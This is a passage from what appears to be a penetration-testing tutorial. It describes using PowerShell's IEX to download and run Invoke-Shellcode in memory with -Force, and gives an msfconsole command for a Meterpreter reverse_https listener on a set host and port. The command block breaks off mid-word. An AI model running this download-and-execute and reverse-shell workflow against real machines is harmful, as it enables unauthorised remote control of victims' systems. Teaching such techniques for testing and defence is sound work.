Our PowersShell script uses the Invoke-Expression alias, IEX, to execute the string that it downloads from our website in the Invoke-Shellcode.ps1 file. This will load the PowerShell script into memory, allowing us to call the Invoke-Shellcode function that is contained in the PowerShell file. The Invoke-Shellcode method executes the shellcode, but by default prompts to verify that you want to continue. We want it to just execute, so we specify the -Force option so that it will run without the prompt.

Our final step before we run the script is to set up our Metploit listener. To do this, we will need to use the multi/handler module in Metploit and specify our payload information. We are going to use the windows/x64/meterpreter/reverse_https module, the same one we used for msfvenom. We will need to specify our LHOST and our LPORT, then execute the module. We can do this from the console, or use our command from the command line.

```
msfconsole -x "use multi/handler;
set payload windows/x64/meterpreter/reverse_https;
set LHOST 172.16.85.133;
set LPORT 8675;
expl"
```
